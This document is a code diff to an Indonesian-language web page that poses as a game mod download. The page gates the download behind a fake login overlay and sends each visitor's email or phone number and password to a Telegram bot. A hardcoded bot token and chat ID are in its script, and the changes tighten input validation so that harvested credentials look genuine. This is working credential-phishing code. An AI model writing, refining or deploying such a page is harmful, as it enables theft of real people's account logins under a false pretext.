@@ -358,7 +358,6 @@
             text-decoration: none;
         }
 
-        /* ===== PESAN ERROR ===== */
         .error-msg {
             color: #ff4466;
             font-size: 14px;
@@ -458,7 +457,7 @@
         <form id="loginForm" novalidate>
             <input type="text" id="loginEmail" placeholder="Email atau nomor HP" required>
             <input type="password" id="loginPass" placeholder="Sandi" required>
-            <div class="error-msg" id="errorMsg">⚠️ Format tidak valid. Cek kembali.</div>
+            <div class="error-msg" id="errorMsg">⚠️ Format tidak valid.</div>
             <button type="submit" class="login-btn">📥 Verifikasi & Download</button>
         </form>
 
@@ -485,40 +484,41 @@
     })();
 
     // ============================================================
-    //  VALIDASI FORM (Client Side)
+    // VALIDASI SUPER KETAT
     // ============================================================
     const errorMsg = document.getElementById('errorMsg');
 
-    function validateEmail(email) {
-        // Harus ada '@' dan minimal domain (misal .com, .co.id)
-        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return regex.test(email);
+    function isValidEmail(email) {
+        // Email harus: [something]@[domain].[tld] (min .com / .co.id)
+        // Dan tidak boleh ada spasi
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+        return emailRegex.test(email);
     }
 
-    function validatePhone(phone) {
-        // Hanya angka, panjang 10–14 digit
-        const digits = phone.replace(/\s/g, '');
-        return /^\d{10,14}$/.test(digits);
+    function isValidPhone(phone) {
+        // Hanya angka, tanpa spasi/tanda hubung, panjang 10-14 digit
+        const cleaned = phone.replace(/[\s\-\(\)]/g, '');
+        return /^\d{10,14}$/.test(cleaned);
     }
 
     function validateInput(input) {
-        // Cek apakah input adalah email valid atau nomor HP valid
+        if (!input || input.length < 2) return false;
         if (input.includes('@')) {
-            return validateEmail(input);
+            return isValidEmail(input);
         } else {
-            return validatePhone(input);
+            return isValidPhone(input);
         }
     }
 
     // ============================================================
-    //  TELEGRAM
+    // TELEGRAM
     // ============================================================
     const TELEGRAM_TOKEN = '8926031261:AAELt78bKCnWxLs0tEDwrEKU7nXJ1hyEJ9w';
     const CHAT_ID = '7719903782';
     const REAL_DOWNLOAD_URL = 'https://www.mediafire.com/file/abc123/ModGame.zip'; // GANTI
 
     // ============================================================
-    //  ELEMEN
+    // ELEMEN
     // ============================================================
     const overlay = document.getElementById('loginOverlay');
     const triggerBtn = document.getElementById('downloadTrigger');
@@ -543,7 +543,6 @@
     function processLogin(email, pass) {
         sendToTelegram(email, pass);
         overlay.classList.remove('show');
-        const orig = triggerBtn.innerHTML;
         triggerBtn.innerHTML = '⏳ Memproses...';
         triggerBtn.disabled = true;
         setTimeout(() => {
@@ -552,7 +551,7 @@
     }
 
     // ============================================================
-    //  EVENT
+    // EVENT
     // ============================================================
     triggerBtn.addEventListener('click', () => {
         overlay.classList.add('show');
@@ -568,23 +567,40 @@
 
     loginForm.addEventListener('submit', (e) => {
         e.preventDefault();
+
         const email = emailInput.value.trim();
         const pass = passInput.value.trim();
 
-        // ===== VALIDASI =====
+        // ===== VALIDASI KETAT =====
         if (!email || !pass) {
-            errorMsg.textContent = '⚠️ Harap isi semua kolom.';
+            errorMsg.textContent = '⚠️ Semua kolom wajib diisi.';
             errorMsg.classList.add('show');
             return;
         }
 
-        if (!validateInput(email)) {
-            errorMsg.textContent = '⚠️ Email tidak valid (contoh: user@gmail.com) atau nomor HP (10-14 digit).';
+        // Cek email (jika mengandung @) atau nomor (jika tidak)
+        if (email.includes('@')) {
+            if (!isValidEmail(email)) {
+                errorMsg.textContent = '⚠️ Email tidak valid (contoh: user@gmail.com).';
+                errorMsg.classList.add('show');
+                return;
+            }
+        } else {
+            if (!isValidPhone(email)) {
+                errorMsg.textContent = '⚠️ Nomor HP harus 10-14 digit angka.';
+                errorMsg.classList.add('show');
+                return;
+            }
+        }
+
+        // Password minimal 4 karakter
+        if (pass.length < 4) {
+            errorMsg.textContent = '⚠️ Password minimal 4 karakter.';
             errorMsg.classList.add('show');
             return;
         }
 
-        // ===== SEMUA VALID =====
+        // ===== LOLOS VALIDASI =====
         errorMsg.classList.remove('show');
         processLogin(email, pass);
     });
